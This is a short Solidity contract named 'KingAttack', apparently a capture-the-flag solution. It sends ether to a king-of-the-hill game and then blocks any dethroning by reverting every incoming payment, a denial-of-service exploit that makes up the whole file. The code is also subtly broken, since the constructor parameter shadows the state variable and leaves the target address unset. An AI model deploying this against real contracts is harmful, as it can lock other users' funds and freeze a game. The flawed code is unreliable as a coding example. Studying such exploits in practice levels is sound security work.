pragma solidity ^0.8.0;

contract KingAttack {
    address public gameAddress;

    constructor(address gameAddress) public{
        gameAddress = gameAddress;
    }

    function loadEther() public payable {
        
    }

    function becomeKing() public{
        gameAddress.call{value: 1 ether}("");
    }

    fallback() external payable{
        revert("nope");
    }
}